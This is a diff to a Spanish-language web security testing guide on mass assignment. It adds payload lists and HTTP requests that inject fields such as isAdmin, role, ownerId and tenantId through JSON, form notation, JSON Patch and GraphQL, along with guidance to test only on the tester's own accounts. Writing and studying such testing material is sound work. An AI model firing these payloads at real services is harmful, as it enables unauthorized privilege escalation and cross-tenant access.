@@ -8,7 +8,101 @@
 - Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
 - Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.
 
-## 🔬 Pruebas por escenario
+> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.
+
+## 💉 Payloads básicos
+
+### Propiedades sensibles en perfil
+
+```json
+{"displayName":"Prueba","isAdmin":true}
+{"displayName":"Prueba","role":"admin"}
+{"displayName":"Prueba","verified":true}
+{"displayName":"Prueba","accountStatus":"active"}
+```
+
+**Cuándo usarlo:** Solicitudes alternativas sobre un perfil propio. La aceptación JSON o eco de respuesta no prueba efecto: releer el estado y verificar un cambio de privilegio real.
+
+**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).
+
+
+### IDs y propiedad asignable
+
+```json
+{"displayName":"Prueba","ownerId":"{ID_A}"}
+{"displayName":"Prueba","ownerId":"{ID_B}"}
+{"displayName":"Prueba","userId":"{ID_B}"}
+{"displayName":"Prueba","tenantId":"{TENANT_B_PROPIO}"}
+```
+
+**Cuándo usarlo:** Usar A y B propios para probar creación o edición. Se requiere que el backend persista el propietario no autorizado; un campo ignorado no es hallazgo.
+
+**Fuente:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).
+
+
+## 🧭 Payloads por contexto
+
+### Campos anidados y notación de formulario
+
+```text
+profile[role]=admin
+user[isAdmin]=true
+account[plan]=premium
+permissions[0]=admin
+role=admin
+```
+
+**Cuándo usarlo:** Una variante por solicitud y solo si el parser admite form encoding o estructuras anidadas. Comparar persistencia y permisos posteriores.
+
+**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Mass%20Assignment/README.md).
+
+
+### Superficies de creación y edición
+
+```text
+POST /api/register
+POST /api/users
+PATCH /api/me
+PUT /api/users/{ID_A}
+POST /graphql
+```
+
+**Cuándo usarlo:** Identificar la ruta real y añadir un campo por vez a un objeto propio. El mismo modelo puede exponer reglas de binding distintas entre registro, perfil y API.
+
+**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).
+
+
+## 🔥 Payloads avanzados
+
+### JSON Patch y campo de sistema
+
+```json
+[{"op":"add","path":"/role","value":"admin"}]
+[{"op":"replace","path":"/isAdmin","value":true}]
+[{"op":"add","path":"/permissions/-","value":"admin"}]
+[{"op":"replace","path":"/ownerId","value":"{ID_B}"}]
+```
+
+**Cuándo usarlo:** Solo para endpoints que aceptan RFC 6902. Son documentos alternativos; modificar privilegios únicamente en un entorno de prueba reversible y comprobar autorización final.
+
+**Fuente:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).
+
+
+### Mutaciones GraphQL con input excesivo
+
+```graphql
+mutation { updateProfile(input:{displayName:"Prueba"}) { id } }
+mutation { updateProfile(input:{displayName:"Prueba",role:"admin"}) { id } }
+mutation { createUser(input:{email:"{EMAIL_PROPIO}",isAdmin:true}) { id } }
+mutation { updateUser(input:{id:"{ID_A}",tenantId:"{TENANT_B_PROPIO}"}) { id } }
+```
+
+**Cuándo usarlo:** Solo enviar campos que el esquema acepte y cuentas propias. El hallazgo exige que un campo reservado se persista y produzca efecto, no solo que aparezca en introspección.
+
+**Fuente:** [PortSwigger](https://portswigger.net/web-security/graphql).
+
+
+## 🔬 Pruebas guiadas por escenario
 
 ### 1. isAdmin en registro
 
@@ -24,7 +118,7 @@ Content-Type: application/json
 
 **Interpretación:** Leer la cuenta creada y probar una función de rol alto. Eco del JSON sin persistencia ni privilegio no confirma fallo.
 
-**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Mass%20Assignment/README.md).
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Mass%20Assignment/README.md).
 
 ### 2. role en actualización de perfil
 
@@ -41,7 +135,7 @@ Content-Type: application/json
 
 **Interpretación:** Comprobar valor persistido y autorización efectiva. Restaurar displayName y no asumir que role es el campo real.
 
-**Fuente técnica:** [documentación de la técnica](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).
+**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).
 
 ### 3. Estado de verificación
 
@@ -58,7 +152,7 @@ Content-Type: application/json
 
 **Interpretación:** Verificar persistencia y una decisión que dependa de verificación; el simple reflejo del campo no demuestra bypass.
 
-**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).
+**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).
 
 ### 4. ownerId en creación de objeto
 
@@ -75,7 +169,7 @@ Content-Type: application/json
 
 **Interpretación:** Si se crea, consultar propiedad con A y B. La API debe derivar el dueño del principal o validar permiso de reasignación.
 
-**Fuente técnica:** [documentación de la técnica](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).
+**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).
 
 ### 5. tenantId no editable
 
@@ -92,7 +186,7 @@ Content-Type: application/json
 
 **Interpretación:** Confirmar si cambió la pertenencia real desde ambas cuentas; un identificador reflejado no prueba traspaso.
 
-**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).
+**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).
 
 ### 6. Objeto anidado sensible
 
@@ -104,7 +198,7 @@ Content-Type: application/json
 
 **Interpretación:** Usar una estructura observada en el modelo real. Algunos binders enlazan propiedades anidadas aun si la UI no las envía.
 
-**Fuente técnica:** [documentación de la técnica](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).
+**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).
 
 ### 7. Binding de formulario
 
@@ -121,7 +215,7 @@ displayName=prueba-controlada&isAdmin=true
 
 **Interpretación:** El formato alterno puede pasar por otro binder. Confirmar persistencia y función de privilegio bajo la cuenta propia.
 
-**Fuente técnica:** [documentación de la técnica](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).
+**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).
 
 ### 8. PUT de objeto completo
 
@@ -138,7 +232,7 @@ Content-Type: application/json
 
 **Interpretación:** Probar solo si PUT conserva campos omitidos o en un objeto descartable propio; corroborar createdBy con GET posterior.
 
-**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).
+**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).
 
 ### 9. Input de mutación GraphQL
 
@@ -151,7 +245,41 @@ variables: {"input":{"displayName":"prueba-controlada","role":"admin"}}
 
 **Interpretación:** La sintaxis de variables se adapta al esquema observado. Si el tipo no declara role, rechazo de validación no informa sobre el binder.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/graphql).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/graphql).
+
+### 10. JSON Patch sobre atributo sensible
+
+**Objetivo:** Solo si el endpoint acepta RFC 6902, intentar reemplazar role en la cuenta propia.
+
+```http
+PATCH /api/me HTTP/1.1
+Host: {ORIGEN}
+Authorization: Bearer {TOKEN_A}
+Content-Type: application/json-patch+json
+
+[{"op":"replace","path":"/role","value":"admin"}]
+```
+
+**Interpretación:** El servidor debe autorizar la ruta de propiedad; comprobar persistencia y privilegio efectivo, no solo eco de patch.
+
+**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/).
+
+### 11. Notación anidada de formulario
+
+**Objetivo:** Si el framework enlaza campos form-urlencoded a objetos, agregar user[role] en perfil propio.
+
+```http
+POST /account/profile HTTP/1.1
+Host: {ORIGEN}
+Cookie: session={SESION_A}
+Content-Type: application/x-www-form-urlencoded
+
+user[displayName]=prueba-controlada&user[role]=admin
+```
+
+**Interpretación:** Aplicar solo a una estructura de formulario observada; confirmar que role se persiste y cambia autorización.
+
+**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).
 
 ## ✅ Evidencia mínima
 
